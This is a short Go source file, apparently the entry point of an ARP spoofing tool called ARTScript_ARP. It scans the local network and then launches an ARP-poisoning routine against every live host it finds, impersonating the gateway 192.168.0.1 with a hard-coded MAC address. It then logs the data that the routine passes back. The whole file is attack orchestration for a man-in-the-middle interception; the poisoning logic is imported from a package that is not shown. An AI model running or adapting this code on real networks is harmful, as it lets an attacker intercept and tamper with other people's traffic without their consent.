package main

import (
	"ARTScript_ARP/arpPosion"
	"ARTScript_ARP/arpScanX"
	"ARTScript_ARP/arpScanX/arp"
	"ARTScript_ARP/globalChan"
	"errors"
	"github.com/withmandala/go-log"
	"os"
	"time"
)

//go:generate oui -p main -o oui.go

var liveTables arp.ArpTables
var channel chan string = make(chan string)

func main() {
	// Setup
	logger := log.New(os.Stderr).WithColor()
	Set_opts()
	opts.DebugMode = false
	opts.InterfaceName = "WLAN"

	// getInterfaceInfo
	localIP, localMac := getLocalInfo("WLAN")
	device, liveTables := arpScanX.Start_arpScan(opts.DebugMode, opts.InterfaceName, opts.Timeout, opts.Backoff)

	logger.Infof("Start arpPosion...")
	for _, arpTable := range liveTables {
		go arpPosion.Start_posion(device.IfaceID,
			"192.168.0.1",
			"80:ea:07:62:72:d6",
			localIP, localMac,
			arpTable.IP,
			arpTable.HardwareAddr)
	}
	for {
		logger.Info(RecvFromChannel())
	}
}

func RecvFromChannel() string {
	logger := log.New(os.Stderr).WithColor()
	abChan := globalChan.GetABGlobalChanString()

	data, err := ReadChanNonBlock(abChan)
	if err != nil {
		logger.Error(err)
	}
	return data
}

func ReadChanNonBlock(ch chan string) (string, error) {
	timeout := time.NewTimer(time.Second * time.Duration(2))

	select {
	case temp := <-ch:
		return temp, nil
	case <-timeout.C:
		return "", errors.New("read time out")
	}
}
